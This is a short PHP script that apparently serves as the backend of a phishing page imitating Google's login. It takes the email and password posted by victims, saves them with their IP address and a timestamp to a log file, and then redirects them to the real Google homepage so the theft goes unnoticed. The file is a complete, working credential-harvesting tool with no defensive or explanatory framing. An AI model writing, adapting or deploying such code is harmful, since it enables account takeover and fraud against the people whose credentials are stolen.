<?php
// Capture POST data from the Google login form
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date("Y-m-d H:i:s");

// Save captured credentials to log.txt
$log_entry = "[$timestamp] IP: $ip | Email: $email | Password: $password\n";
file_put_contents('log.txt', $log_entry, FILE_APPEND);

// Redirect the client to the real Google homepage
header("Location: https://www.google.com");
exit();
?>
